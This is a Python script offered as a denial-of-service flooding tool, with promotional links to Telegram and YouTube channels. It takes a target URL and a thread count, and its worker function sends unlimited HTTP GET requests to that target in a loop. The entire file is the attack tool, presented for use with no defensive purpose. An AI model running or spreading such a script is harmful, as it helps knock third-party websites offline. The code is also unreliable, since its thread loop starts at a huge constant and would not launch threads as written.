import os
import colorama
import threading
import requests
os.system("clear")
print ("Telegram - @cyberll0")
print ("Chat - t.me/cyberll2")
print ("Channel  YouTube - https://www.youtube.com/channel/UCLuCD1Vi1JB1TdH5-h4t7ow")
print ("")
print ("")
print ("")
print ("")
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
            threads = 9999999999999999999999999999999999
 
url = input("URL: ")
 
try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")
 
if threads == 0:
    exit("Threads count is incorrect!")
 
if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")
 
if not url.__contains__("."):
    exit("Invalid domain")
 
for i in range(9999999999999999999999999999999999, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!")
